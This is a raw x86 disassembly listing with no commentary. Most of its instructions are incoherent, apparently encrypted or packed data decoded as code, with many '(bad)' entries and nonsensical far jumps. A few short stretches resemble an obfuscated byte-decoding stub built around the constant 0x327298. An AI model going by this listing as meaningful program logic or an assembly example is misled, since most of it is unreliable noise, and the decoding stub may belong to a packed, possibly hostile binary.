  40507b:	loop   0x4050ef
  40507d:	inc    esp
  40507e:	stos   BYTE PTR es:[edi],al
  40507f:	jp     0x4050ce
  405081:	xchg   ecx,eax
  405082:	aam    0xe7
  405084:	lahf   
  405085:	jns    0x4050e3
  405087:	sub    BYTE PTR [esi-0x48e53f6d],al
  40508d:	mov    ebx,0x1a893ef7
  405092:	mov    dl,0x35
  405094:	mov    cl,BYTE PTR [ebx]
  405096:	or     eax,0x8735d76c
  40509b:	enter  0xcb19,0xc3
  40509f:	mov    edi,0x9627c95a
  4050a4:	iret   
  4050a5:	stos   DWORD PTR es:[edi],eax
  4050a6:	push   cs
  4050a7:	(bad)  
  4050a8:	call   0xdf7b70cb
  4050ad:	jne    0x40509a
  4050af:	out    0x6d,al
  4050b1:	push   ss
  4050b2:	sbb    BYTE PTR [esi],cl
  4050b4:	fcomp  QWORD PTR ds:0xb4176f8a
  4050ba:	jl     0x405089
  4050bc:	loopne 0x40509e
  4050be:	push   edx
  4050bf:	ss stos BYTE PTR es:[edi],al
  4050c1:	add    BYTE PTR [edx+0x60],al
  4050c4:	mov    esp,0x68bf4fbc
  4050c9:	(bad)  
  4050ca:	int    0xff
  4050cc:	sub    edi,eax
  4050ce:	add    edi,DWORD PTR [ebp+0x10]
  4050d1:	xor    edx,ecx
  4050d3:	add    edx,esi
  4050d5:	cmp    edx,edi
  4050d7:	ja     0x4059fd
  4050dd:	push   ebx
  4050de:	jmp    0x4053d8
  4050e3:	mov    esi,0x327298
  4050e8:	jmp    0x4053d8
  4050ed:	aas    
  4050ee:	rol    dh,1
  4050f0:	int3   
  4050f1:	aad    0xd2
  4050f3:	(bad)  
  4050f5:	dec    esp
  4050f6:	sub    BYTE PTR [ebx+0x3d2675fe],bh
  4050fc:	cmp    eax,0x787830e8
  405101:	dec    ebp
  405102:	jle    0x40517c
  405104:	js     0x40515a
  405106:	cli    
  405107:	mov    ax,ds:0xe4a64378
  40510d:	sbb    BYTE PTR [eax-0x41b28b0a],ch
  405113:	push   esi
  405114:	and    DWORD PTR [esi],0xffffffee
  405117:	out    0x94,al
  405119:	push   cs
  40511a:	ds in  al,dx
  40511c:	xchg   dh,bh
  40511e:	leave  
  40511f:	leave  
  405120:	cdq    
  405121:	pop    eax
  405122:	out    dx,al
  405123:	and    eax,0x3bac29d5
  405128:	data16 lods al,BYTE PTR ds:[esi]
  40512a:	jno    0x40515f
  40512c:	in     eax,dx
  40512d:	or     eax,0x5af191e9
  405132:	push   es
  405133:	pop    ebx
  405134:	std    
  405135:	mov    ch,0xca
  405137:	rol    bl,cl
  405139:	arpl   WORD PTR [edi-0x2a],di
  40513c:	sub    BYTE PTR [edx],dh
  40513e:	xor    ah,bh
  405140:	mov    ds:0xd3bbcfd7,eax
  405145:	jge    0x4051a9
  405147:	inc    ecx
  405148:	test   al,0x66
  40514a:	fucompp 
  40514c:	dec    ecx
  40514d:	cmp    eax,0x5e52f7be
  405152:	sar    DWORD PTR [ecx+eiz*2+0x69048fe8],cl
  405159:	adc    al,0x61
  40515b:	sbb    al,BYTE PTR [ebx-0xe97f3d6]
  405161:	push   ebx
  405162:	push   ebx
  405163:	mov    bh,0x8b
  405165:	ret    0x6994
  405168:	xor    DWORD PTR [edi],ebx
  40516a:	xchg   edi,eax
  40516b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40516c:	adc    eax,eax
  40516e:	xchg   ebp,eax
  40516f:	(bad)  
  405171:	arpl   cx,ax
  405173:	mov    edx,edx
  405175:	ins    DWORD PTR es:[edi],dx
  405176:	ret    
  405177:	add    eax,0xca155b6a
  40517c:	mov    ch,0x5e
  40517e:	cmp    edi,edx
  405180:	mov    al,0x16
  405182:	or     ebp,edi
  405184:	dec    eax
  405185:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405186:	inc    esi
  405187:	inc    ecx
  405188:	inc    esp
  405189:	data16 icebp 
  40518b:	push   ss
  40518c:	and    edi,DWORD PTR [ebx+0x3bedbe90]
  405192:	in     al,0xde
  405194:	enter  0x7781,0xa4
  405198:	ret    0x7c30
  40519b:	mov    cl,0xda
  40519d:	out    dx,al
  40519e:	clc    
  40519f:	add    ecx,esp
  4051a1:	ret    0xd88
  4051a4:	loope  0x4051e2
  4051a6:	js     0x405225
  4051a8:	xor    al,bh
  4051aa:	jmp    0x40518c
  4051ac:	ja     0x4051fc
  4051ae:	dec    edi
  4051af:	stos   BYTE PTR es:[edi],al
  4051b0:	test   BYTE PTR [esi-0x58],0xe1
  4051b4:	sub    eax,DWORD PTR [ecx]
  4051b6:	jne    0x40514a
  4051b8:	retf   0x460f
  4051bb:	cwde   
  4051bc:	xchg   esp,eax
  4051bd:	iret   
  4051be:	mov    BYTE PTR [edi],bh
  4051c0:	xchg   ecx,eax
  4051c1:	(bad)  
  4051c2:	jmp    0x676a9a1b
  4051c7:	xchg   edx,eax
  4051c8:	xor    dh,BYTE PTR [eax-0x31]
  4051cb:	cli    
  4051cc:	mov    al,0xf1
  4051ce:	jbe    0x405166
  4051d0:	int    0x95
  4051d2:	iret   
  4051d3:	gs cmp ecx,ecx
  4051d6:	fdiv   QWORD PTR fs:[eax-0x64bcb751]
  4051dd:	dec    esp
  4051de:	and    eax,0x3262a39f
  4051e3:	xlat   BYTE PTR ds:[ebx]
  4051e4:	dec    ecx
  4051e5:	ds sub al,0xa1
  4051e8:	adc    esi,edx
  4051ea:	test   al,0x3b
  4051ec:	rcr    BYTE PTR [eax],0xcb
  4051ef:	lea    ebx,[eax-0x48]
  4051f2:	sub    DWORD PTR [ebx+0x848cade],esp
  4051f8:	mov    ebx,0x8cbd6edc
  4051fd:	nop
  4051fe:	les    ebx,FWORD PTR [edi-0x76]
  405201:	push   ebp
  405202:	jb     0x405231
  405204:	ins    BYTE PTR es:[edi],dx
  405205:	(bad)  
  405206:	rol    edi,1
  405208:	cmp    al,0x73
  40520a:	inc    eax
  40520b:	pop    es
  40520c:	popf   
  40520d:	pop    edx
  40520e:	ss (bad) 
  405210:	xor    eax,0xf90c7dc5
  405215:	jmp    0x2257e057
  40521a:	sbb    eax,0xe6a62083
  40521f:	sti    
  405220:	push   edi
  405221:	or     bl,BYTE PTR [ecx]
  405223:	dec    esp
  405224:	lahf   
  405225:	add    al,0x8c
  405227:	jno    0x4051b3
  405229:	js     0x4051be
  40522b:	scas   eax,DWORD PTR es:[edi]
  40522c:	cmp    BYTE PTR [ebp-0x68dc721a],bl
  405232:	mov    DWORD PTR [edx+0x66],esi
  405235:	jmp    0x88004fd9
  40523a:	inc    eax
  40523b:	and    ah,al
  40523d:	mov    ebp,0xf73e9016
  405242:	(bad)  
  405243:	(bad)
  405246:	push   ss
  405247:	lock mov dh,0x4c
  40524a:	mov    edx,0xea9b719b
  40524f:	test   eax,0x74419c72
  405254:	mov    es,ebx
  405256:	sbb    cl,bl
  405258:	cs pop eax
  40525a:	sahf   
  40525b:	jb     0x40525b
  40525d:	push   ss
  40525e:	xchg   ebp,eax
  40525f:	mov    eax,DWORD PTR es:[edi-0x62]
  405263:	mov    dl,0x5b
  405265:	sar    DWORD PTR [ebp-0x3216be50],cl
  40526b:	sbb    al,0x2f
  40526d:	or     BYTE PTR [esi],dh
  40526f:	hlt    
  405270:	or     dh,bl
  405272:	and    BYTE PTR [edi-0x44],dh
  405275:	adc    eax,eax
  405277:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405278:	push   0x9d1fa953
  40527d:	idiv   BYTE PTR [ecx+edi*2+0x3161993f]
  405284:	jle    0x405253
  405286:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405287:	rol    BYTE PTR [ebx-0x35f6a9ab],1
  40528d:	in     al,0xd4
  40528f:	aaa    
  405290:	jns    0x405231
  405292:	fist   DWORD PTR [ebx]
  405294:	dec    eax
  405295:	jo     0x4052d3
  405297:	sbb    esp,DWORD PTR ds:0x2f7e2202
  40529d:	jo     0x405246
  40529f:	sbb    eax,0xfa7f27e6
  4052a4:	repnz and al,0xa4
  4052a7:	push   ebp
  4052a8:	enter  0xd5b7,0x15
  4052ac:	dec    ecx
  4052ad:	jecxz  0x4052d0
  4052af:	int3   
  4052b0:	pop    esi
  4052b1:	mov    bh,0xf9
  4052b3:	pop    ss
  4052b4:	clc    
  4052b5:	jno    0x40523e
  4052b7:	scas   eax,DWORD PTR es:[edi]
  4052b8:	adc    BYTE PTR [ecx+0x3d],bl
  4052bb:	fwait
  4052bc:	data16 das 
  4052be:	cs and al,0xe8
  4052c1:	or     edx,DWORD PTR [ebx+0x58]
  4052c4:	retf   0x4919
  4052c7:	imul   esi,DWORD PTR [ebx+0x65401bf1],0x6427a64
  4052d1:	push   edi
  4052d2:	not    ebp
  4052d4:	pushf  
  4052d5:	(bad)  
  4052d7:	or     dh,BYTE PTR [esi-0x52]
  4052da:	and    eax,0x32514ea8
  4052df:	xor    eax,0xcc5ea18b
  4052e4:	mov    cl,0x88
  4052e6:	lods   al,BYTE PTR ds:[esi]
  4052e7:	sub    DWORD PTR [edi+0x8],ebp
  4052ea:	dec    esi
  4052eb:	pop    esi
  4052ec:	daa    
  4052ed:	loopne 0x40528d
  4052ef:	cmp    DWORD PTR [ebp-0x40],0xffffff99
  4052f3:	jnp    0x40529d
  4052f5:	repnz int3 
  4052f7:	clc    
  4052f8:	jno    0x4052af
  4052fa:	lods   eax,DWORD PTR ds:[esi]
  4052fb:	call   0x5748:0xdba148d7
  405302:	and    BYTE PTR [ecx],cl
  405304:	sbb    al,bl
  405306:	and    dl,ch
  405308:	mov    ah,BYTE PTR [ebx]
  40530a:	cs and al,0x67
  40530d:	jns    0x405370
  40530f:	sub    al,0x4d
  405311:	into   
  405312:	sbb    edi,DWORD PTR [edi-0x1ebb86a9]
  405318:	scas   eax,DWORD PTR es:[edi]
  405319:	push   esi
  40531a:	js     0x405369
  40531c:	scas   al,BYTE PTR es:[edi]
  40531d:	fldcw  WORD PTR [ecx+esi*4+0x19d3a7c8]
  405324:	mov    ebp,0xaa62aa53
  405329:	mov    ecx,0xd04c634a
  40532e:	cmp    DWORD PTR [ebx+0xef56867],ebx
  405334:	jns    0x405381
  405336:	mov    esi,0x787fdde5
  40533b:	repz adc DWORD PTR [eax+ebp*8],eax
  40533f:	pop    ecx
  405340:	jbe    0x405398
  405342:	push   esi
  405343:	xor    eax,0xabf9dba4
  405348:	dec    esp
  405349:	loopne 0x405340
  40534b:	or     dl,BYTE PTR [esi+0x67]
  40534e:	jmp    0x3f4d:0x989f3d56
  405355:	sahf   
  405356:	call   0x4040:0xdfdf076a
  40535d:	fld    TBYTE PTR [edi+ebp*1-0x11]
  405361:	stos   BYTE PTR es:[edi],al
  405362:	scas   al,BYTE PTR es:[edi]
  405363:	(bad)  
  405364:	push   esp
  405365:	jle    0x4052e8
  405367:	or     eax,0x88f93a7d
  40536c:	loopne 0x405348
  40536e:	call   DWORD PTR [ecx+esi*1+0x76fc6818]
  405375:	inc    edx
  405376:	jb     0x405304
  405378:	push   eax
  405379:	mov    edx,0x39e52055
  40537e:	jns    0x405358
  405380:	retf   0x6e77
  405383:	lea    edx,[edx-0x5771424e]
  405389:	pop    ss
  40538a:	mov    al,ds:0x93a59704
  40538f:	jg     0x40537b
  405391:	mov    esi,0x43c4f02b
  405396:	adc    ebp,eax
  405398:	fcom   QWORD PTR [ecx]
  40539a:	sub    DWORD PTR [edi+0x2a2d255f],eax
  4053a0:	jb     0x40540c
  4053a2:	mov    edi,0xe717b754
  4053a7:	add    ecx,ebx
  4053a9:	xchg   ebp,eax
  4053aa:	fwait
  4053ab:	inc    esi
  4053ac:	lds    edx,FWORD PTR [ebx]
  4053ae:	(bad)  
  4053af:	push   0x725929
  4053b4:	lahf   
  4053b5:	or     eax,DWORD PTR [edx-0x9]
  4053b8:	scas   eax,DWORD PTR es:[edi]
  4053b9:	fcom   QWORD PTR [edx]
  4053bb:	sbb    ah,dh
  4053bd:	push   esp
  4053be:	or     eax,0x1e1bc312
  4053c3:	sub    DWORD PTR [ecx-0x1],ebp
  4053c6:	shl    dl,0xc6
  4053c9:	(bad)  
  4053cb:	mov    eax,0x3e874f24
  4053d0:	xor    DWORD PTR [ecx],ecx
  4053d2:	push   ss
  4053d3:	sbb    DWORD PTR [esi-0x7427fb6a],0xebe9f845
  4053dd:	add    al,BYTE PTR [eax]
  4053df:	add    ch,cl
  4053e1:	rcl    edx,cl
  4053e3:	(bad)  
  4053e4:	ror    cl,cl
  4053e6:	aad    0xd9
  4053e8:	inc    edx
  4053e9:	jecxz  0x40544a
  4053eb:	fdiv   st(7),st
  4053ed:	jne    0x4053f5
  4053ef:	jo     0x40542e
  4053f1:	xor    eax,0x7e4d7878
  4053f6:	js     0x405470
  4053f8:	jecxz  0x405395
  4053fa:	ret    0xbb90
  4053fd:	pop    edi
  4053fe:	xor    DWORD PTR [ecx],0x71
  405401:	dec    eax
  405402:	pop    ss
  405403:	cmp    BYTE PTR [ebx-0x62],0x90
  405407:	push   ebp
  405408:	mov    BYTE PTR [edx-0x4b0dd7a1],bl
  40540e:	js     0x4053f4
  405410:	ins    BYTE PTR es:[edi],dx
  405411:	in     al,0x7f
  405413:	xchg   BYTE PTR [esp+edi*2+0x69c204d4],bh
  40541a:	xchg   BYTE PTR es:[eax+esi*4],bh
  40541e:	add    eax,DWORD PTR [eax+0x652d745]
  405424:	inc    ecx
  405425:	mul    DWORD PTR [edi]
  405427:	sub    al,0xd7
  405429:	xor    BYTE PTR [edi],al
  40542b:	mov    BYTE PTR [eax+ebp*8+0x58],ch
  40542f:	rcl    ebp,0x43
  405432:	push   ebx
  405433:	sti    
  405434:	sub    al,0xee
  405436:	mov    dl,0xec
  405438:	loopne 0x405440
  40543a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40543b:	imul   eax,ecx,0x12bbc7e7
  405441:	sti    
  405442:	sub    ecx,DWORD PTR [edx-0x45]
  405445:	add    ah,BYTE PTR [ebp+0x4ade2c9e]
  40544b:	add    eax,0x7b6644fe
  405450:	cdq    
  405451:	int3   
  405452:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405453:	lods   al,BYTE PTR ds:[esi]
  405454:	and    edi,DWORD PTR [edx]
  405456:	(bad)  
  405458:	xchg   ebx,eax
  405459:	pop    ds
  40545a:	pop    esp
  40545b:	push   esp
  40545c:	jg     0x405413
  40545e:	push   ecx
  40545f:	call   0x9e0840cb
  405464:	das    
  405465:	mov    DWORD PTR [edx+0x75ca5d96],ecx
  40546b:	or     al,BYTE PTR [ebp+0x49ac4998]
  405471:	mov    cs,WORD PTR [ecx+0x64d9c567]
  405477:	and    edi,esp
  405479:	shr    DWORD PTR [ecx+0x26a2e0e2],cl
  40547f:	add    DWORD PTR [esi-0x31],ebp
  405482:	mov    dh,0xf6
  405484:	repnz sbb bl,BYTE PTR [ebp+0x55dd64a7]
  40548b:	push   eax
  40548c:	xchg   edx,eax
  40548d:	sbb    bh,al
  40548f:	mov    edi,ds
  405491:	ins    DWORD PTR es:[edi],dx
  405492:	inc    eax
  405493:	or     esp,ebp
  405495:	xor    al,0xd8
  405497:	fild   QWORD PTR [edx+ebp*4]
  40549a:	lods   eax,DWORD PTR ds:[esi]
  40549b:	or     eax,0x33cbee8
  4054a0:	xor    BYTE PTR [ebx],0x4f
  4054a3:	xchg   esp,eax
  4054a4:	push   edi
  4054a5:	xor    ch,al
  4054a7:	mov    gs,WORD PTR [edi]
  4054a9:	xor    al,BYTE PTR [ecx-0x5c8ad7f5]
  4054af:	mov    dl,0x48
  4054b1:	or     BYTE PTR [edi],cl
  4054b3:	lea    edx,[eax+ebx*2+0xb7122b9]
  4054ba:	add    BYTE PTR ds:0xbda0b065,bl
  4054c0:	shl    DWORD PTR [esi],1
  4054c2:	sub    eax,0x1e93406c
  4054c7:	xchg   edi,eax
  4054c8:	pop    edx
  4054c9:	mov    eax,0x635afe46
  4054ce:	inc    esp
  4054cf:	push   ss
  4054d0:	shl    DWORD PTR [edx+0x7126e77a],cl
  4054d6:	mov    dh,0xaf
  4054d8:	ja     0x4054f5
  4054da:	iret   
  4054db:	inc    eax
  4054dc:	push   ebp
  4054dd:	xchg   edx,eax
  4054de:	jb     0x405517
  4054e0:	push   ss
  4054e1:	out    dx,al
  4054e2:	leave  
  4054e3:	nop
  4054e4:	mov    bl,0x9e
  4054e6:	dec    eax
  4054e7:	(bad)  
  4054e8:	mov    ecx,DWORD PTR [eax]
  4054ea:	mov    bh,0xb
  4054ec:	and    al,0xda
  4054ee:	cmp    eax,0xa43612f
  4054f3:	sti    
  4054f4:	mov    al,ds:0x9287e0e6
  4054f9:	xchg   bl,dl
  4054fb:	enter  0xf4d1,0xf8
  4054ff:	je     0x40548d
  405501:	mov    es,WORD PTR [ecx]
  405503:	or     al,BYTE PTR [ecx+0x1c]
  405506:	sub    dl,cl
  405508:	js     0x405542
  40550a:	cwde   
  40550b:	rcr    cl,1
  40550d:	(bad)  
  40550e:	pop    ss
  40550f:	sub    ebp,esi
  405511:	cmp    ch,BYTE PTR [ecx+0x50ff8787]
  405517:	xor    bh,bl
  405519:	into   
  40551a:	dec    edi
  40551b:	scas   al,BYTE PTR es:[edi]
  40551c:	jmp    0x1220:0x5cadf57f
  405523:	and    al,0xd4
  405525:	xchg   DWORD PTR [edi-0x454f3ed],eax
  40552b:	inc    esp
  40552c:	xchg   ebx,eax
  40552d:	mov    bh,0xb3
  40552f:	int    0xd8
  405531:	lock cwde 
  405533:	in     al,dx
  405534:	inc    ebx
  405535:	fisubr DWORD PTR [ebx]
  405537:	aam    0xd5
  405539:	mov    dh,0x4d
  40553b:	std    
  40553c:	xor    eax,ebp
  40553e:	adc    eax,DWORD PTR [eax-0x10]
  405541:	xchg   ebx,eax
  405542:	jmp    0xa1a7:0x59a92c77
  405549:	repz adc BYTE PTR [ebp-0x2],dl
  40554d:	loop   0x405568
  40554f:	pop    edx
  405550:	fcmovne st,st(5)
  405552:	xchg   bh,bl
  405554:	(bad)  
  405556:	or     al,0x5d
  405558:	sbb    al,al
  40555a:	arpl   WORD PTR [eax],di
  40555c:	jecxz  0x405526
  40555e:	aas    
  40555f:	cdq    
  405560:	out    dx,al
  405561:	push   ebx
  405562:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405563:	add    ch,dh
  405565:	in     eax,dx
  405566:	xchg   ebp,eax
  405567:	and    ch,BYTE PTR [edi+0x45e582d0]
  40556d:	fldenv [ebx+0x37]
  405570:	lock and DWORD PTR [edx+0x5c54e4ce],0xfc84827d
  40557b:	xchg   DWORD PTR [edi*4+0x66531f04],edi
  405582:	jmp    0x4960:0x572f0a80
  405589:	jmp    0x688ba060
  40558e:	cmp    esp,DWORD PTR [eax+0x11]
  405591:	test   eax,0xf8ea29bf
  405596:	push   eax
  405597:	scas   eax,DWORD PTR es:[edi]
  405598:	pop    ecx
  405599:	adc    BYTE PTR [esi-0x44355f43],ah
  40559f:	sbb    edx,ebx
  4055a1:	(bad)  
  4055a2:	jns    0x4055fe
  4055a4:	rol    esi,cl
  4055a6:	jno    0x405611
  4055a8:	mov    BYTE PTR [esi],bl
  4055aa:	jae    0x405571
  4055ac:	cld    
  4055ad:	mov    ds:0x2d000179,al
  4055b2:	add    BYTE PTR [eax],ah
  4055b4:	pop    esi
  4055b5:	push   ebx
  4055b6:	pop    es
  4055b7:	rcr    DWORD PTR [ebp+0xcf84213],cl
  4055bd:	xchg   edi,eax
  4055be:	loopne 0x405623
  4055c0:	inc    edi
  4055c1:	or     eax,0x93ecc29d
  4055c6:	mov    bh,0x34
  4055c8:	enter  0x1aa1,0x32
  4055cc:	daa    
  4055cd:	add    DWORD PTR [ebx-0x1c1069c6],edi
  4055d3:	lea    esp,[esi]
  4055d5:	or     DWORD PTR [eax+ecx*2+0x32f1d7f6],ebx
  4055dc:	mov    fs,WORD PTR [eax-0x55]
  4055df:	cdq    
  4055e0:	cmp    al,0xe9
  4055e2:	imul   ecx,DWORD PTR [edi+ebx*1],0xffffff82
  4055e6:	sar    BYTE PTR [edx-0x4d6a89de],cl
  4055ec:	or     bh,ah
  4055ee:	sar    DWORD PTR ds:0x86dcb8d7,0xd3
  4055f5:	iret   
  4055f6:	sub    al,0x5a
  4055f8:	mov    dl,0x44
  4055fa:	in     al,dx
  4055fb:	and    dh,BYTE PTR [edi+0x10]
  4055fe:	push   ebp
  4055ff:	shr    edi,1
  405601:	pop    es
  405602:	mov    DWORD PTR [eax],esp
  405604:	iret   
  405605:	cmp    bh,BYTE PTR [edx-0x3aaddf9c]
  40560b:	mov    DWORD PTR ds:0x6d6f5115,ebx
  405611:	jno    0x405666
  405613:	mov    ds:0x53e297d4,al
  405618:	into   
  405619:	xchg   ecx,eax
  40561a:	lds    ebx,FWORD PTR [esi+0x64]
  40561d:	outs   dx,BYTE PTR ds:[esi]
  40561e:	leave  
  40561f:	add    al,0xb0
  405621:	pop    ss
  405622:	inc    ebp
  405623:	mov    WORD PTR [ebp+0x63],fs
  405626:	pop    ebx
  405627:	or     al,0x59
  405629:	loop   0x4055fd
  40562b:	fidivr DWORD PTR [ebx*1+0x5aa9a411]
  405632:	jne    0x40564b
  405634:	pmovmskb edx,mm7
  405637:	sar    al,1
  405639:	div    BYTE PTR [ebx+ecx*8]
  40563c:	dec    eax
  40563d:	mov    ebx,DWORD PTR [esi+0x66]
  405640:	out    dx,al
  405641:	add    DWORD PTR [edx+0x4],eax
  405644:	inc    esp
  405645:	int    0xae
  405647:	xchg   DWORD PTR [esi],eax
  405649:	jl     0x405603
  40564b:	ret    
  40564c:	mov    bl,0xb9
  40564e:	mov    al,ds:0xd3c48730
  405653:	xchg   esi,eax
  405654:	and    al,dl
  405656:	mov    ebp,0x230616e5
  40565b:	push   edx
  40565c:	jo     0x405672
  40565e:	add    ecx,DWORD PTR [esi]
  405660:	xchg   esi,eax
  405661:	mov    dl,al
  405663:	xor    ah,BYTE PTR [ebp+0x708c5ed9]
  405669:	iret   
  40566a:	mov    cl,0x67
  40566c:	add    edi,DWORD PTR [ebx-0x24]
  40566f:	jle    0x4056d8
  405671:	cwde   
  405672:	nop
  405673:	cmp    BYTE PTR [ebx+0x57328c92],bl
  405679:	rcr    esi,0x7e
  40567c:	fst    QWORD PTR [ecx+eax*2-0x5d]
  405680:	push   eax
  405681:	xchg   ecx,eax
  405682:	sub    eax,0x736cf1b2
  405687:	adc    esi,DWORD PTR [ebp+0x4d]
  40568a:	test   DWORD PTR [esp+ecx*4+0x1b],ecx
  40568e:	ins    DWORD PTR es:[edi],dx
  40568f:	sub    al,0x94
  405691:	xor    ah,BYTE PTR [esi*1+0x4de67e]
  405698:	outs   dx,BYTE PTR ds:[esi]
  405699:	xchg   edx,eax
  40569a:	push   edi
  40569b:	mov    ah,0x6a
  40569d:	cdq    
  40569e:	inc    edi
  40569f:	stc    
  4056a0:	cmp    BYTE PTR [ebp+0x7f],dh
  4056a3:	sbb    DWORD PTR [esi],eax
  4056a5:	ror    BYTE PTR [edi-0x63],cl
  4056a8:	scas   al,BYTE PTR es:[edi]
  4056a9:	aam    0xf7
  4056ab:	scas   eax,DWORD PTR es:[edi]
  4056ac:	(bad)  
  4056ae:	push   esp
  4056af:	mov    ss,WORD PTR [esp+eiz*4+0x11e0fae1]
  4056b6:	jns    0x405697
  4056b8:	div    BYTE PTR [edx+0x7c]
  4056bb:	(bad)  
  4056bc:	dec    esi
  4056bd:	fimul  WORD PTR [esp+esi*8+0x2a48c80b]
  4056c4:	es retf 
  4056c6:	push   esp
  4056c7:	cwde   
  4056c8:	daa    
  4056c9:	div    BYTE PTR [edi+0x33fc7d8b]
  4056cf:	stc    
  4056d0:	add    edi,esi
  4056d2:	mov    esi,DWORD PTR [ebp+0x8]
  4056d5:	imul   edi,edx
  4056d8:	mov    ebx,DWORD PTR [ebp+0xc]
  4056db:	xor    eax,ecx
  4056dd:	add    eax,edx
  4056df:	mov    al,BYTE PTR [ebx+eax*1+0x327298]
  4056e6:	mov    BYTE PTR [edi+esi*1],al
  4056e9:	mov    eax,DWORD PTR [ebp-0x4]
  4056ec:	xor    eax,ecx
  4056ee:	lea    edx,[edx+eax*1+0x327298]
  4056f5:	mov    eax,DWORD PTR [ebp-0x4]
  4056f8:	xor    eax,ecx
  4056fa:	mov    esi,0xffcd8d68
  4056ff:	sub    esi,eax
  405701:	jmp    0x4059f1
  405706:	rol    esi,cl
  405708:	retf   0xd9c2
  40570b:	ret    0xd5db
  40570e:	shr    DWORD PTR [edx],0xd2
  405711:	ins    BYTE PTR es:[edi],dx
  405712:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405713:	xchg   edi,eax
  405714:	les    esi,FWORD PTR [edx+edx*1+0x4d78783a]
  40571b:	jle    0x405795
  40571d:	js     0x405787
  40571f:	jnp    0x40571d
  405721:	cmp    eax,ecx
  405723:	dec    esp
  405724:	(bad)  
  405726:	ins    BYTE PTR es:[edi],dx
  405727:	cmp    al,0x9c
  405729:	retf   
  40572a:	fsubr  QWORD PTR [ebp+0x20]
  40572d:	mov    ebp,0xa8ba1302
  405732:	mov    al,ds:0xb6641967
  405737:	cs test eax,0x8ef7cc92
  40573d:	mov    ah,0x49
  40573f:	mov    al,ds:0xc08a8665
  405744:	scas   al,BYTE PTR es:[edi]
  405745:	ins    DWORD PTR es:[edi],dx
  405746:	sub    esi,DWORD PTR [edx-0x2e6afc4b]
  40574c:	scas   al,BYTE PTR es:[edi]
  40574d:	fucomp st(2)
  40574f:	repnz mov ecx,0x7ca89fab
  405755:	std    
  405756:	fucom  st(7)
  405758:	lds    ebp,FWORD PTR [edx+0x45]
  40575b:	sub    edx,ebp
  40575d:	sbb    al,0x4
  40575f:	leave  
  405760:	push   esi
  405761:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405762:	pop    esi
  405763:	das    
  405764:	fdiv   QWORD PTR [ecx]
  405766:	mov    ds:0x8101046d,eax
  40576b:	icebp  
  40576c:	mov    BYTE PTR [esi-0x6226737e],bh
  405772:	imul   ebx,DWORD PTR [edi],0x124f70d8
  405778:	sahf   
  405779:	inc    eax
  40577a:	mov    al,BYTE PTR [ebx+0x521aed01]
  405780:	xchg   ebx,eax
  405781:	mov    cl,0x2a
  405783:	arpl   WORD PTR [ebx-0x57f17692],bx
  405789:	cli    
  40578a:	fld    QWORD PTR [eax-0x5]
  40578d:	mov    dh,0xa7
  40578f:	cdq    
  405790:	nop
  405791:	push   eax
  405792:	dec    ebx
  405793:	bound  esi,QWORD PTR [edi]
  405795:	cwde   
  405796:	cmp    eax,0x8fa3bd
  40579b:	mov    bl,0x67
  40579d:	aas    
  40579e:	call   0xeb064c47
  4057a3:	test   DWORD PTR [edi+0x6eb1dacf],esi
  4057a9:	xchg   esi,eax
  4057aa:	in     eax,dx
  4057ab:	inc    eax
  4057ac:	das    
  4057ad:	neg    BYTE PTR es:[ebx]
  4057b0:	dec    edx
  4057b1:	bound  ebx,QWORD PTR [ebx]
  4057b3:	mov    ds,WORD PTR [ebx+edx*2]
  4057b6:	pop    ebp
  4057b7:	mov    dl,0x4e
  4057b9:	imul   BYTE PTR [edx]
  4057bb:	icebp  
  4057bc:	xchg   esp,eax
  4057bd:	jnp    0x40577c
  4057bf:	mov    edi,0x16833cde
  4057c4:	std    
  4057c5:	out    dx,al
  4057c6:	stc    
  4057c7:	loop   0x4057c9
  4057c9:	mov    ecx,?
  4057cb:	jae    0x40580a
  4057cd:	inc    esp
  4057ce:	loop   0x4057f8
  4057d0:	ss xchg edi,eax
  4057d2:	pop    edi
  4057d3:	mov    ss,WORD PTR [edx-0x4]
  4057d6:	jb     0x40575e
  4057d8:	jecxz  0x40584f
  4057da:	cs ins DWORD PTR es:[edi],dx
  4057dc:	mov    al,ds:0x75d51f80
  4057e1:	test   DWORD PTR [edi],edi
  4057e3:	loop   0x4057b1
  4057e5:	call   0x4c961815
  4057ea:	pop    ebp
  4057eb:	test   DWORD PTR [ebp+0x712481ec],ebp
  4057f1:	aad    0x51
  4057f3:	in     al,0x57
  4057f5:	aaa    
  4057f6:	add    dl,dl
  4057f8:	fidivr WORD PTR [edx+0x117feb92]
  4057fe:	push   edi
  4057ff:	mov    al,ds:0x2e68b7d1
  405804:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405805:	fadd   QWORD PTR [ebx]
  405807:	sub    BYTE PTR [ebp+0x44],ah
  40580a:	xchg   BYTE PTR [esi-0x38da6b06],bl
  405810:	jl     0x4057b4
  405812:	xchg   DWORD PTR [edi+0x12],esp
  405815:	pop    edx
  405816:	add    DWORD PTR [eax+edi*4+0x533e9029],0xffffffda
  40581e:	sub    al,BYTE PTR [edx+0x3]
  405821:	cmp    eax,0x733ee766
  405826:	sbb    ecx,DWORD PTR [esi]
  405828:	repnz and al,0xda
  40582b:	inc    ebx
  40582c:	or     bh,BYTE PTR [ecx+0x3c010f3e]
  405832:	out    0x28,al
  405834:	aaa    
  405835:	sub    al,0x6a
  405837:	add    BYTE PTR [ecx+0x60fe94f4],al
  40583d:	fcmovnbe st,st(5)
  40583f:	stc    
  405840:	sbb    al,0x85
  405842:	push   eax
  405843:	push   ecx
  405844:	clc    
  405845:	mov    ch,0x4b
  405847:	mov    ch,0x5e
  405849:	wrmsr  
  40584b:	pop    edx
  40584c:	(bad)  
  40584d:	out    0xc6,al
  40584f:	lock xchg edi,eax
  405851:	dec    ebp
  405852:	adc    cl,BYTE PTR [edi]
  405854:	xor    di,dx
  405857:	mov    edi,0x3f005693
  40585c:	call   0xe9d:0x9c9970a0
  405863:	cmc    
  405864:	(bad)  
  405867:	sbb    eax,0x94e0d9b0
  40586c:	xchg   esi,eax
  40586d:	cdq    
  40586e:	mov    bh,0x64
  405870:	int3   
  405871:	cwde   
